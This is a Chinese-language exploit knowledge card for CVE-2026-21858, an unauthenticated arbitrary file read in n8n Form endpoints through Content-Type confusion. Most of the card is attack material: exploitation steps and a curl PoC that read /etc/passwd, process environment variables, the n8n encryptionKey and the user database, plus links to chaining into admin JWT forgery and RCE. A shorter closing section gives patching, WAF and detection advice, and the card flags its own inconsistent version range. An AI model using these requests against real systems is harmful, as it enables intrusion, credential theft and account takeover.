---
id: web-nodejs-n8n-form-content-type-confusion-file-read
title: n8n Form 端点 Content-Type 混淆：JSON 体控制 filepath 实现无认证任意文件读取（CVE-2026-21858）
type: scenario
domain: web
path: web/nodejs
technique: n8n-form-content-type-confusion-arbitrary-file-read
aliases:
- CVE-2026-21858
- n8n Form 任意文件读取
- n8n copyBinaryFile 文件读取
- Content-Type 混淆读文件
- n8n 无认证文件读取
tags:
- n8n
- nodejs
- form
- content-type
- arbitrary-file-read
- file-upload
- webhook
- cve-2026-21858
cve:
- CVE-2026-21858
severity: critical
confidence: high
status: verified
affected_versions: n8n 0.211.0 至 1.65.0（原文）；修复于 1.121.0
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V29
  verified_at: '2026-11-05T03:12:59+08:00'
  notes: 已通读原文并解码查看10张内嵌截图。核对：Webhook.node.js 将 files[].filepath 传入 copyBinaryFile、BinaryData.service.js 默认 fs.readFile、修复为强制 multipart；图1 /etc/passwd 回显、图3 environ（HOME=/home/node, N8N_VERSION=1.65.0）、图4 config encryptionKey、图5 user 表 admin 记录均一致。未验证点：PoC 未在本机执行；原文影响区间写 0.211.0–1.65.0 又写修复 1.121.0，二者矛盾，已按原文标记保留并在卡内注明。frontmatter 无 sources/source_url（库内惯例），来源 xz.aliyun.com/news/92554。
---

## 一句话结论

n8n 的 Form（Webhook）端点在处理文件上传字段时不校验请求的 `Content-Type` 是否 multipart；攻击者用 `application/json` 提交 `files[].filepath` 即可跳过 formidable 解析，让 `copyBinaryFile` 直接对攻击者指定的路径调用 `fs.readFile`，在无认证的公开 Form 上读取 n8n 进程可访问的任意文件。

## 原理

- 入口在 Webhook 节点的 Form 处理逻辑：遍历请求体 `files` 字段，对每项调用 `copyBinaryFile(file.filepath, ...)`：
  ```js
  // n8n 1.65.0 Webhook.node.js
  returnItem.binary[binaryPropertyName] =
    await context.nodeHelpers.copyBinaryFile(
      file.filepath,          // 直接来自请求体，未校验
      file.originalFilename,
      file.mimetype
    );
  ```
- `file.filepath` 来自 `getBodyData()`。请求为 `multipart/form-data` 时，它使用 formidable 解析结果中的临时文件路径；但请求为 `application/json` 时，它跳过 formidable，直接从 JSON 体的 `files[].filepath` 取值，没有任何路径校验。
- `copyBinaryFile` 在默认（非 binary-data manager）模式下调用 `fs.readFile(filePath, { encoding: BINARY_ENCODING })`：
  ```js
  // n8n 1.65.0 BinaryData.service.js
  async copyBinaryFile(workflowId, executionId, binaryData, filePath) {
      const manager = this.managers[this.mode];
      if (!manager) {
          const { size } = await stat(filePath);
          binaryData.fileSize = prettyBytes(size);
          binaryData.data = await readFile(filePath, { encoding: BINARY_ENCODING });
          return binaryData;
      }
  }
  ```
- 因此漏洞本质是“信任了请求体声明的文件路径”，且未把入口格式（multipart）作为前置条件。修复只在入口加一行：
  ```js
  // n8n >= 1.121.0
  assert(req.contentType === 'multipart/form-data', 'Expected multipart/form-data');
  ```
- 读取权限取决于 n8n 进程运行用户。Docker 默认以 `node` 运行，可读 `/home/node/` 下配置与 SQLite 数据库、`/proc` 进程信息、挂载卷；读不到仅 root 可读的 `/etc/shadow` 等。

## 触发条件

- 目标 n8n 版本在 0.211.0 至 1.65.0（原文测试 1.65.0；1.121.0 已修复）。
- 实例存在一个公开可访问的 Form 页面，且该 Form 包含 file upload 字段（通常还配合 Respond to Webhook 节点把文件内容返回）。
- 攻击者知道 Form 的 URL（Form 设计上就是对外公开的，路径常可枚举/收集）。
- 不需要认证、不需要任何前置凭据。
- 目标进程对目标文件有读权限。

## 利用步骤

1. 探测 Form 端点存活：`GET /form/<path>` 返回 200。
2. 发送 `Content-Type: application/json` 的 POST，body 中构造 `files` 对象，仅 `filepath` 生效：
   ```json
   {"data":{},"files":{"x":{"filepath":"/etc/passwd"}}}
   ```
3. 首次验证可用 `/etc/passwd`；随后优先读 `/proc/self/environ`，获取 `HOME`、`N8N_VERSION`、`WEBHOOK_URL`、Cookie 安全配置等。
4. 按 `HOME` 拼出配置路径，读 `.n8n/config` 取 `encryptionKey`；读 `.n8n/database.sqlite` 取 `user` 表的 `id/email/password`。
5. 后续可衔接 encryptionKey → JWT 伪造（见关联卡）或直接读取挂载卷、`.env`、`/proc/1/cmdline` 等敏感文件。
6. 路径扫描时注意：`/dev/stdin` 返回空；`/etc/shadow` 权限不足；数据库文件过大时 `copyBinaryFile` 会把整个文件读入内存，可能返回 500。

## PoC

```bash
# 1. 确认 Form 存活
curl -s -o /dev/null -w "%{http_code}" http://target:5678/form/vulnerable-form

# 2. 任意文件读取
curl -s -X POST http://target:5678/form/vulnerable-form \
  -H "Content-Type: application/json" \
  -d '{"data":{},"files":{"x":{"filepath":"/etc/passwd"}}}'

# 3. 读环境变量（定位 HOME 与版本）
curl -s -X POST http://target:5678/form/vulnerable-form \
  -H "Content-Type: application/json" \
  -d '{"data":{},"files":{"x":{"filepath":"/proc/self/environ"}}}' | tr '\0' '\n'

# 4. 读 n8n 配置与数据库
curl -s -X POST http://target:5678/form/vulnerable-form \
  -H "Content-Type: application/json" \
  -d '{"data":{},"files":{"x":{"filepath":"/home/node/.n8n/config"}}}'

curl -s -X POST http://target:5678/form/vulnerable-form \
  -H "Content-Type: application/json" \
  -d '{"data":{},"files":{"x":{"filepath":"/home/node/.n8n/database.sqlite"}}}' > db.sqlite
```

```text
# 预期（1.65.0）
root:x:0:0:root:/root:/bin/sh
...
# 1.121.0 相同请求返回 400
```

## 变体与关联

- 变体（读取目标）：`/proc/self/environ`、`/proc/1/cmdline`、`$HOME/.n8n/config`、`$HOME/.n8n/database.sqlite`、`/.dockerenv`、`.env`、挂载卷中的业务文件。
- 变体（入口）：任何把请求体 `files[].filepath` 或等价路径字段交给文件 API 的 Form/Webhook 处理逻辑，都可能复现同类“入口格式未校验”问题。
- 关联：[[web-nodejs-n8n-encryptionkey-jwt-forgery-admin-takeover]]（读取 encryptionKey 与数据库后伪造 admin JWT）。
- 关联：[[web-nodejs-n8n-expression-sandbox-escape-rce]]（取得 admin 后用表达式注入逃逸沙箱执行命令）。
- 边界：读不到 root-only 文件；超大文件会导致内存压力；非默认 binary data 存储模式时 `copyBinaryFile` 走 manager 分支，行为可能不同。

## 检测与防御

- 升级：n8n ≥ 1.121.0（入口强制 `Content-Type: multipart/form-data`）。
- 缓解：反向代理对 `/form/` 做 IP 白名单/Basic Auth，不要把 Form 端点暴露公网；WAF 拦截 `Content-Type: application/json` 且 body 含 `files.filepath` 的请求（需测试误伤）。
- 加固：Form 端点仅服务内部用户；文件读取改用固定临时目录与随机文件名，绝不接受客户端路径；以最小权限用户运行 n8n，隔离挂载卷与数据库文件。
- 检测：`/form/` 的 POST 请求中 `Content-Type` 为 `application/json` 且 body 含 `files`/`filepath`；响应体出现 `/etc/passwd`、环境变量、SQLite 二进制内容；同一来源短时间内对多个敏感路径的 Form POST。
- 检测：n8n 日志/代理日志中 `/form/` 端点异常访问；数据库文件被通过 Form 读取（响应体积突增）。
- 事后：轮换 `encryptionKey`、数据库密码与所有第三方凭证；审计历史访问日志。
